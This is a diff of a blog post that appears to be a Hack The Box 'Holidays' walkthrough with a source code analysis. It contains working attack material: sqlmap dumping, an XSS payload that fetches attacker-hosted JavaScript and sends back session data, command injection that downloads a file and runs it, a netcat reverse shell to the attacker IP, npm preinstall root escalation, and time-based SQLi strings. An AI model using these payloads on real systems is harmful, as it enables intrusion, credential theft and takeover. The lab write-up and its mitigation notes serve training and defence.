@@ -12,22 +12,39 @@ The hack the box machine "Holidays" is a hard machine which requires knowledge i
 
 The next two sections provide an overview of the exploitation process followed by a code analysis to identify the vulnerabilites in the source code. Feel free to skip or skim the next section if you already know how to exploit this particular Hack The Box machine. 
 
-# Overview of Exploitation
-The first step
+# Overview of the Exploitation
+The first step is to scan the host for open ports. This can be done using `nmap` by executing a command like `nmap -p- -sS -sC 10.10.10.25` which scans for all potentially open ports using a SYN scan followed by a version scan and scripts scan on the open ports. From the results, it is possible to see that port `22` and `8000` are open and that ssh and HTTP are running on these ports. The next step is to bruteforce for directories or files on the web application. Depending on the user agent, one might get different results. More specifically, some user agents result in a `200 OK` while others result in a `404 Not Found`. One of the user agents that works is "Linux". As such, the command below can be used to enumerate web pages and find a login panel at `http://10.10.10.25:8000/login`.
 
-Capture login post request to http://10.10.10.25:8000/login in burp, change user-agent to “Linux” and press “copy to file” > linux.req              #Routing is different depending on user-agent
+{% highlight none linenos %}
+gobuster dir -u http://10.10.10.25:8000 -w /usr/share/seclists/Discovery/Web-Content/big.txt --useragent "Linux"
+{% endhighlight %}
+
+Next, sqlmap can be used to leak database content since there is an SQL injection vulnerability in the username field. This can be performed by capturing a login attempt in BURP, saving it to a file named "linux.req" and executing the following command.
+
+{% highlight none linenos %}
 sqlmap -r linux.req --level=5 --risk=3 -T users --dump -threads 10
-We get RickA:fdc8cd4cff2c19e0d1022e78481ddf36:nevergonnagiveyouup           (cracked with crackstation)
-Log in to http://10.10.10.25:8000/login
+{% endhighlight %}
 
-genPayload.py
+From the output of the command, it is possible to obtain the username "RickA" and password hash "fdc8cd4cff2c19e0d1022e78481ddf36". This password hash can then be cracked with an online cracking tool such as [crackstation](https://crackstation.net/) to obtain the password "nevergonnagiveyouup". Then, it is possible to login with these credentials at the login panel at `http://10.10.10.25:8000/login`. After login in, we are redirected to `http://10.10.10.25:8000/agent` where we can see different bookings. Clicking on a booking leads us to a page `http://10.10.10.25:8000/vac/[ID]` where `[ID]` is the id of the booking. On this page, we can click the "Notes" tab to reach the page shown below, where we can add a note to the selected booking. In addition, there is a text message stating that all notes has to be approved my an administrator.
+
+![addNote](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/addNote.png)
+
+At this point, one could suspect that a stored XSS vulnerability could be present since submitted notes might not be filtered appropriately. It is, however, not easy to verify this since we can not see the notes we submit until an administrator reviews them. However, after playing around a bit with various payloads and filter evasion techniques, it is possible to verify that an XSS vulnerability exists by tricking the administrators browser to perform a request to our host. More specifically, it is possible to inject javascript code in the administrators browser by abusing an `img` tag while representing the javascript payload with character codes. The template below can be used for creating notes which execute javascript in the administrators browser. Note that `[payload]` is a sequence of comma separated integers which result in a javascript payload when converted to a string using [UTF-16](https://en.wikipedia.org/wiki/UTF-16).
+
+{% highlight javascript linenos %}
+<img src="x/><script>eval(String.fromCharCode([payload]));</script>">
+{% endhighlight %}
+
+Representing javascript with character codes can be automated in python, as shown below. To make things easy, we use a payload which requests a javascript file from a remote host which it then executes. We save this file with the name "generateEvilNote.py" for later use. Note that the ip `10.10.14.25` is the ip of the attacking computer and might thus be different depending on the VPN connection.
+
 {% highlight python linenos %}
 payload = """document.write('<script src="http://10.10.14.25/x.js"></script>')"""
 nums = [str(ord(i)) for i in payload]
 print('<img src="x/><script>eval(String.fromCharCode('+','.join(nums)+'));</script>">')
 {% endhighlight %}
 
-x.js
+Next, we put the javascript below in a file named "x.js". This code requests a specific booking page, encodes the response with base64 and then sends us the base64 encoded response.
+
 {% highlight Javascript linenos %}
 req1 = new XMLHttpRequest();
 req1.open("GET","http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65",false);
@@ -37,45 +54,69 @@ req2.open("GET","http://10.10.14.25/leak?x="+btoa(req1.responseText),false);
 req2.send();
 {% endhighlight %}
 
-Sudo python3 -m 80
-python3 genPayload.py | xclip -selection clipboard
-Post a comment with the clipboard content
-Wait 1 minutes. Then, copy the base64 content from the web server output and put in x.b64
-cat x.b64 | base64 -d > x.html
-Get the cookie value from x.html    (connect.sid&#x3D;s%3A0c2b6ab0-2905-11ec-93c0-9b5646fb6973.5woc5mpM%2F9dn5RN9MmvdvDeOtDts1f423a6mkfALt70)
-Add the cookie in the browser and go to http://10.10.10.25:8000/admin
+Then, we start a web server by executing 
+`sudo python3 -m http.server 80` in the directory where the `x.js` file is located. Thereafter, we generate the payload by executing `python3 generateEvilNote.py`, submit it as a note and wait for less than a minute. After waiting for a bit, the web server receives a request for the `x.js` file and a subsequent request which leaks the base64 encoded response. We can then proceed by copying the base64 encoded content from the web server output and putting it in a file named "x.b64". Then, we simply execute the command below, retrieve the cookie named "connect.sid" from the output of the command, place it in our browser session and navigate to `http://10.10.10.25:8000/admin`. 
 
-sudo rlwrap nc -lvnp 443
-nano rs
-GET /admin/export?table=x%26wget+168431129/rs
-GET /admin/export?table=x%26bash+rs
+{% highlight javascript linenos %}
+cat x.b64 | base64 -d
+{% endhighlight %}
 
-The privilege escalation can be performed by abusing sudo rights on npm. As can be seen by using `sudo -l`, we can install arbitrary NPM packages with root privileges. This could be dangerous as it is possible install an NPM package which runs code before the installation process begins. By x, it is possible to run arbitrary code. This can be done by creating a custom node package module. For this, we can use the template (rimrafall github) which contains a folder named "rimrafall" with a package.JSON file. We modify the package.json file to look as below and leave the index.js file as it is.
+At this point, we have hijacked the administrators session and navigating to the URL thus leads us to the page shown below. 
 
+![export](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/export.png)
 
+Among other things, there is a possiblity to export tables by pushing the buttons at the bottom of the page. Pushing one of the buttons sends a `GET` requests to the "/admin/export" endpoint which includes a table name in a parameter named "table". After trying to send a variety of URL encoded special characters through this parameter, it is possible to deduce that the value of the `table` parameter is placed in a bash command which is executed. However, there is a filter in place which only allows for certain characters. One of the characters is the ampersand character `&` which can be used to execute any bash commands which can pass the filter.
+
+{% highlight bash linenos %}
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.25 9000 >/tmp/f
+{% endhighlight %}
+
+Armed with this information, we can create a file named `rs` with the content above. We place this in the web server root of the python web server started earlier. We then start a listener by executing the command `nc -lvnp 9000` and visit the two URLs below to download and execute the reverse shell payload in the `rs` file. Note that `%26` is the URL encoded representation of the ampersand character `&`.
+
+{% highlight none linenos %}
+http://10.10.10.25:8000/admin/export?table=x%26wget+168431129/rs
+http://10.10.10.25:8000/admin/export?table=x%26bash+rs
+{% endhighlight %}
+
+Once these two URLs have been visited, the netcat listener receives a connection from the target and we are greeted with a bash prompt, as can be seen below.
+
+![rce](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/rce.png)
+
+The next step is to perform a privilege escalation to get code execution as `root`. The privilege escalation can be performed by abusing sudo rights on npm. By executing `sudo -l`, it is possible to see the line `(ALL) NOPASSWD: /usr/bin/npm i *` which means that we can install arbitrary Node packages with root privileges. This could be dangerous as it is possible install an NPM package which runs a set of bash commands before the installation process begins. To create such a package, we execute the command `mkdir privescPackage` and create a file named "package.json" in the newly created directory `privescPackage`. We then fill the `package.json` file with the content below. Note that we won't need to create the main file `index.js`, defined on line 4, since the payload should be executed before the installation.
+
+{% highlight json linenos %}
+{
+  "name": "privescPackage",
+  "version": "1.0.0",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "/bin/bash -i"
+  }
+}
+{% endhighlight %}
+
+At line 6, it is stated that the command `/bin/bash -i` should be executed before the installation begins. Next, we simply attempt to install the package using the command `sudo npm i privescPackage --unsafe`. Shortly after executing the command, we acquire a shell on the target as the `root` user, as can be seen in the image below
+
+![root](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/root.png)
+
+<!-- echo 'ewogICJuYW1lIjogInByaXZlc2NQYWNrYWdlIiwKICAidmVyc2lvbiI6ICIxLjAuMCIsCiAgIm1haW4iOiAiaW5kZXguanMiLAogICJzY3JpcHRzIjogewogICAgInByZWluc3RhbGwiOiAiL2Jpbi9iYXNoIC1pIgogIH0KfQo=' | base64 -d > ./privescPackage/package.json 
+echo 'bW9kdWxlLmV4cG9ydHMgPSAiVGhpcyBzdHJpbmcgZG9lcyBub3QgbWF0dGVyIjsK' | base64 -d > ./privescPackage/index.js
 Note that preinstall is executed when we run npm install. In fact these scripts are executed:
 https://docs.npmjs.com/cli/v7/using-npm/scripts#npm-install
 
-(package.json)
-
 Package.json 
 https://docs.npmjs.com/cli/v7/configuring-npm/package-json#name
+-->
 
-
-(index.js)
-
-Next, we start a listner on a free port, in this example we chose port 9999.
-
-sudo npm i rimrafall to attempt to install the custom node module as a root user, triggering the execution of our reverse shell payload.
-
-
-
-# Code analysis
-To get started with the code analysis, I started by downloading the code from the machine using the `SCP` command. More specifically, I downloaded the folder `/home/algernon/app`. After downloading the folder, I opened it in VSCode. This showed me the files which are visible in the image below. The folder had a file named "package.json" which stated that the main file was named "index.js". As such, this file became the starting point for the analysis.
+# Code Analysis
+To get started with the code analysis, I started by downloading the code from the machine using the `SCP` command. More specifically, I changed the password of the `root` user to "root" by executing `passwd`. Then, I downloaded the folder `/home/algernon/app` by executing `scp -r root@10.10.10.25:/home/algernon/app /tmp/app` and typing the password "root". 
 
 ![files](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/files.png)
 
-## User-Agent Filtering
+After downloading the folder, I opened it in the text editor VSCode. This showed me the files which are visible in the image above. The folder had a file named "package.json" which stated that the main file was named "index.js". As such, this file became the starting point for the analysis.
+
+## User Agent Filtering
 
 The content of the project's `index.js` file is shown below. Here, the `waterfall` function is used to call multiple functions. One of these functions was the `setupApp` function(line x) which called the `appSetup` function whose code can be found in the file `/home/algernon/app/setup/app.js`. 
 {% highlight Javascript linenos %}
@@ -266,29 +307,7 @@ As a final note, if this code was present in a real web application, the general
 
 ## SQL Injection Vulnerability
 
-The database is filled in the db.js file which is invoked from the index.js file.
-
-{% highlight Javascript linenos %}
-var db = new sqlite3.Database('hex.db');
-{% endhighlight %}
-
-{% highlight Javascript linenos %}
-module.exports = function(callback) {
-  async.waterfall([
-    function(cb) {
-      db.run('PRAGMA journal_mode = OFF;', cb);
-    },
-    function(cb) {
-      db.run('SELECT * FROM users', function(err) {
-        if (!err) return cb('Already setup');
-
-        return cb();
-      });
-    },
-{% endhighlight %}
-
-
-The router.js file contains the code which is executed when a specific endpoint is queried. This code is configured from the index.js file.
+The web application uses an [sqlite](https://www.sqlite.org/index.html) database which is filled by the `setupDB` function whose code is located in the `db.js` file. The `router.js` file contains the code which is executed when specific endpoints are queried. This code is configured from the `index.js` file, shown below.
 {% highlight Javascript linenos %}
 [...]
 var routerSetup = require('./setup/router');
@@ -305,14 +324,6 @@ async.waterfall([
 [...]
 );
 {% endhighlight %}
-
-Note line x, where the req.body.username parameter is placed into the query string. This query parameter is then sent to the the database by using the `scope.db.get` function at line x.
-
-`SELECT id, username, password, active FROM users WHERE (active=1 AND (username = "[username]"))` where [username] is the username supplied in the body of the request
-
-If we let [username] be `")) -- sleep(1)`, we can force a delay to verify that we have remote code execution on the machine. This works since the query becomes the query below. Note that any characters after the comment character `--` won't be interpreted as part of the query. At this point, data can be exfiltrated using blind SQLI attacks. TODO: Check
-
-`SELECT id, username, password, active FROM users WHERE (active=1 AND (username = " ")) -- "))`
 
 {% highlight Javascript linenos %}
 module.exports = function(scope, callback) {
@@ -344,7 +355,19 @@ module.exports = function(scope, callback) {
 };
 {% endhighlight %}
 
-To prevent SQL Injection vulnerabilities, the general recommendation is to use prepared statemnts. It is also, normally, strongly recommended to always filter user supplied input using a white list of allowed characters. 
+The code block above shows the code in the `router.js` file which correspodns to the `routerSetup` function. What is important to note here is that the `req.body.username` parameter is placed into the query string at line 9, without first being filtered. This query string is assigned to the parameter `query` which is then sent to the the database through the `scope.db.get` function call at line 12. This means that the statement below is the statement which is executed by the database. Note that `[username]` represents the username supplied in the body of the login request.
+
+`SELECT id, username, password, active FROM users WHERE (active=1 AND (username = "[username]"))` 
+
+If we let `[username]` be `") OR HEX(RANDOMBLOB(100000000)) OR ("x`, we can force a time delay to verify that we have remote code execution on the machine by turning the query into the query shown below. This works by creating a large random binary object and converting it to hex using the `RANDOMBLOB` and `HEX` functions, which will take a couple of seconds. The last part of the username `OR ("x` is used to ensure that the query is still a valid query after the injection.
+
+`SELECT id, username, password, active FROM users WHERE (active=1 AND (username = "") OR HEX(RANDOMBLOB(100000000)) OR ("x"))` 
+
+![delay](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/delay.png)
+
+It can be validated that this payload works by using `curl`, as shown in the image above(By studing the "Total time" field). At this point, data can be exfiltrated through time-based blind SQL injection attacks, either manually or automatically using automated tools like sqlmap. 
+
+To prevent SQL Injection vulnerabilities, the general recommendation is to use prepared statemnts. It is also, normally, strongly recommended to always filter user supplied input using a white list of allowed characters. This is important since it prevents special characters from being interpreted in dangerous ways.
 
 ## XSS Vulnerability
 {% highlight Javascript linenos %}
